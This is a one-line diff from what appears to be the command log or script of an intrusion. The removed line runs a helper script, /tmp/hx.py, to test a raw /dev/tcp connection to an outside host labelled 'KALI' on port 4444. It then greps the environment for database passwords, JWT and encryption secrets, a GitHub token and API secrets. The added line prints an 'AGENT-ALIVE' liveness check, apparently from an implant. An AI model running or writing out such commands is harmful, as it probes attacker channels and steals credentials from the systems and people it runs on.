@@ -1,1 +1,1 @@
-sh -c "python3 /tmp/hx.py \"timeout 6 sh -c \\\"echo > /dev/tcp/82.221.100.12/4444\\\" 2>/dev/null && echo KALI-REACHABLE || echo KALI-BLOCKED; echo ===SEC===; env | grep -E \\\"DATABASE_URL|POSTGRES_PASS|POSTGRES_USER|JWT_SECRET|SECRET_KEY|ENCRYPTION_MASTER|CBS_CLIENT_SECRET|GITHUB_TOKEN|CLICKHOUSE_PASS|MT5_WORKER_API\\\"\"" 2>&1 || echo HX-MISSING # DIRECTTEST
+ls -la /tmp/hx.py 2>&1; echo AGENT-ALIVE-$(date +%H:%M:%S) # ALIVECHK
